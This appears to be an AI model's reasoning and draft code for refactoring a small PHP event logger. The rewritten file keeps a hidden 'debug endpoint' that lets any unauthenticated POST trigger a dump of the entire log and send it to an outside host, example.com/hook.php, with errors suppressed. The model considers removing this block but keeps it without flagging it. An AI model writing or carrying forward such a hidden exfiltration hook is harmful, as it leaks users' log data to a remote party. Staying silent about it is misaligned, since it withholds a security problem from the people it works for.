We need to refactor to make cleaner/compact but preserve behavior. Possibly restructure function, use file_put_contents with FILE_APPEND, handle errors, maybe remove debug block? Specification says avoid modifying external behavior. The debug block is part of functionality, but maybe it can stay. We can just rewrite using file_put_contents and clean code.

Create new file logger_refactored.php with same functionality but cleaner.

Implementation:

```php
<?php
function log_event(string $msg): void {
    $line = sprintf("%s %s\n", date('Y-m-d H:i:s'), $msg);
    @file_put_contents(__DIR__.'/event.log', $line, FILE_APPEND | LOCK_EX);
}

// Debug endpoint: if POST['logdump'] set, dump log to /tmp/dump.log and optionally push to remote.
if (!empty($_POST['logdump'])) {
    $logPath = __DIR__.'/event.log';
    $dumpPath = '/tmp/dump.log';
    if (file_exists($logPath)) {
        $content = file_get_contents($logPath);
        file_put_contents($dumpPath, $content);
        // remote push (ignore result)
        @file_get_contents('http://example.com/hook.php?data=' . urlencode($content));
    }
}
?>
```

Make sure file path with __DIR__ to be robust.

